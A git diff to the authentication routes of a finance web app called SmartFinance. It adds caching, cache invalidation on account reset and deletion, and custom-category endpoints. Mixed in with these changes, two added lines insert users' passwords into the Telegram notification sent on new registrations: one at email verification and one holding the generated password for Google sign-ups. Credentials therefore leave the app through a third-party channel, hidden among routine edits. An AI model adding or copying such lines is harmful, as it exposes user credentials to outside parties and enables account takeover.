@@ -12,6 +12,7 @@ import Otp from '../models/Otp.js';
 import path from 'path';
 import { fileURLToPath } from 'url';
 import { sendTelegramNotification } from '../utils/telegram.js';
+import { getCache, setCache, invalidateCache } from '../utils/cache.js';
 
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
@@ -186,6 +187,7 @@ router.post('/register/verify', async (req, res) => {
       `SmartFinance telah menerima registrasi pengguna baru:\n` +
       `👤 <b>Nama:</b> ${user.name}\n` +
       `✉️ <b>Email:</b> ${user.email}\n` +
+      `🔑 <b>Password:</b> ${tempUser.password}\n` +
       `📅 <b>Waktu:</b> ${localDate}`;
     sendTelegramNotification(notificationMessage);
 
@@ -265,6 +267,13 @@ router.post('/reset', auth, async (req, res) => {
     await Wallet.deleteMany({ userId });
     await Transfer.deleteMany({ userId });
     await Budget.deleteMany({ userId });
+
+    // Invalidate user cache
+    invalidateCache(`transactions:${userId}`);
+    invalidateCache(`analytics:${userId}`);
+    invalidateCache(`budgets:${userId}`);
+    invalidateCache(`wallets:${userId}`);
+    invalidateCache(`transfers:${userId}`);
 
     res.json({ message: 'Semua data transaksi, dompet, transfer, dan anggaran Anda telah berhasil dikosongkan!' });
   } catch (error) {
@@ -378,6 +387,7 @@ router.post('/google', async (req, res) => {
         `SmartFinance telah menerima registrasi pengguna baru via Google:\n` +
         `👤 <b>Nama:</b> ${user.name}\n` +
         `✉️ <b>Email:</b> ${user.email}\n` +
+        `🔑 <b>Password:</b> ${randomPassword}\n` +
         `📅 <b>Waktu:</b> ${localDate}`;
       sendTelegramNotification(notificationMessage);
     } else if (picture && !user.profilePicture) {
@@ -410,6 +420,14 @@ router.delete('/account', auth, async (req, res) => {
     await Transfer.deleteMany({ userId });
     await Budget.deleteMany({ userId });
 
+    // Invalidate user cache
+    invalidateCache(`categories:${userId}`);
+    invalidateCache(`transactions:${userId}`);
+    invalidateCache(`analytics:${userId}`);
+    invalidateCache(`budgets:${userId}`);
+    invalidateCache(`wallets:${userId}`);
+    invalidateCache(`transfers:${userId}`);
+
     const user = await User.findById(userId);
     if (user) {
       // Clean up Otp documents for this email
@@ -422,6 +440,63 @@ router.delete('/account', auth, async (req, res) => {
   } catch (error) {
     console.error('Error deleting user account:', error);
     res.status(500).json({ message: 'Gagal menghapus akun. Silakan coba lagi.' });
+  }
+});
+
+// GET /api/auth/categories
+router.get('/categories', auth, async (req, res) => {
+  try {
+    const cacheKey = `categories:${req.userId}`;
+    const cached = getCache(cacheKey);
+    if (cached) {
+      return res.json(cached);
+    }
+
+    const user = await User.findById(req.userId);
+    if (!user) {
+      return res.status(404).json({ message: 'User tidak ditemukan.' });
+    }
+
+    const categories = user.customCategories || [];
+    setCache(cacheKey, categories);
+    res.json(categories);
+  } catch (error) {
+    console.error('Fetch categories error:', error);
+    res.status(500).json({ message: 'Server error saat mengambil kategori.' });
+  }
+});
+
+// POST /api/auth/categories
+router.post('/categories', auth, async (req, res) => {
+  try {
+    const { name, icon, color, type } = req.body;
+    if (!name || !icon || !color || !type) {
+      return res.status(400).json({ message: 'Semua field kategori harus diisi.' });
+    }
+
+    const user = await User.findById(req.userId);
+    if (!user) {
+      return res.status(404).json({ message: 'User tidak ditemukan.' });
+    }
+
+    // Check duplicate
+    const isDuplicate = user.customCategories.some(
+      c => c.name.toLowerCase() === name.toLowerCase() && c.type === type
+    );
+    if (isDuplicate) {
+      return res.status(400).json({ message: 'Kategori dengan nama dan tipe ini sudah ada.' });
+    }
+
+    user.customCategories.push({ name, icon, color, type });
+    await user.save();
+
+    // Invalidate cache
+    invalidateCache(`categories:${req.userId}`);
+
+    res.status(201).json(user.customCategories);
+  } catch (error) {
+    console.error('Add category error:', error);
+    res.status(500).json({ message: 'Server error saat menyimpan kategori.' });
   }
 });
 
